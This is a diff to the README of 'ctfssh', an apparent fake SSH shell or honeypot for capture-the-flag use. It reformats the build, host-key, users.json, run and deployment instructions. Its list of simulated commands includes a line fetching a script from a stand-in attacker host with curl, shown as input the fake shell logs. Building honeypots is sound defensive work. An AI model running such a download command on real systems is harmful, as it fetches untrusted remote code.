@@ -28,9 +28,19 @@
 ---
 
 ## 📁 Project Layout
-
-. ├── main.go # Entrypoint ├── users.go # Authentication logic ├── commands.go # Command dispatch and execution ├── hostkey.go # Host key loader/generator ├── ratelimit.go # Login rate-limiting ├── users.json # User definitions ├── host_key # SSH server key ├── command/ # Simulated executables (curl, ping, etc.) ├── text/ # Static command output (ls, uname, etc.) ├── help/ # Help messages per command ├── work/ # Optional user work directory
-
+```
+├── main.go # Entrypoint 
+├── users.go # Authentication logic 
+├── commands.go # Command dispatch and execution 
+├── hostkey.go # Host key loader/generator 
+├── ratelimit.go # Login rate-limiting 
+├── users.json # User definitions 
+├── host_key # SSH server key 
+├── command/ # Simulated executables (curl, ping, etc.) 
+├── text/ # Static command output (ls, uname, etc.) 
+├── help/ # Help messages per command 
+├── work/ # Optional user work directory
+```
 ---
 
 ## 🚀 Quick Start
@@ -39,11 +49,15 @@
 
 ```bash
 go build -o ctfssh
+```
 🔐 Host Key
 Generate it on first run or with:
+```bash
 make hostkey
+```
 👤 Create users.json
 Example:
+```json
 [
   {
     "username": "admin",
@@ -55,27 +69,33 @@ Example:
     "banner": "Welcome to your secure fake shell"
   }
 ]
+```
+
 Generate hashes:
+```bash
 python3 -c 'import crypt; print(crypt.crypt("admin", crypt.mksalt(crypt.METHOD_SHA512)))'
+```
+
 ▶️ Run the Server
+```bash
 ./ctfssh --port 2222 --hostkey host_key --users users.json --banner "SSH-2.0-CTFssh"
+```
+
 🧪 Simulated Commands
 
 cat /proc/cpuinfo
 curl https://attacker.com/file.sh
 ping 8.8.8.8
 w, last, uname, uptime, ls, id
+
 🔒 Security & Safety
 
 All commands are isolated and non-destructive
 Inputs are parsed and sanitized
 No shell or command chaining allowed
 Rate limiting blocks bruteforce attempts
-Can safely be run on port 22 using:
-authbind
-setcap
-iptables redirect
-🧠 Good To Know
+Can safely be run on port 22 using setcap or iptables redirect
+
 
 
 Flag	Description
@@ -83,36 +103,23 @@ Flag	Description
 --hostkey	Path to SSH private key
 --users	Path to user config JSON
 --banner	SSH version banner string
+
 📦 Example Commands in command/
 
 cat → fake /proc and /etc reads
 curl, wget → logs URLs and mimics download
 ping → fake ICMP responses
 w, last → fake session reports
+
 📤 Deployment
 
 Use make build or:
+```bash
 go build -o ctfssh main.go users.go commands.go hostkey.go ratelimit.go
+```
+
 Use authbind, iptables, or setcap to bind to port 22 as non-root.
 🛡️ License
 
 MIT
-💬 Contributing
-
-Pull requests welcome — especially for new fake command modules or integrations.
-🖼️ Screenshot
-
-$ ssh admin@localhost -p 2222
-Welcome to your secure fake shell
-Type 'help' to see available commands.
-
-$ help
-Available commands:
-  - ls
-  - cat
-  - curl
-  - wget
-  - exit
-
----
 
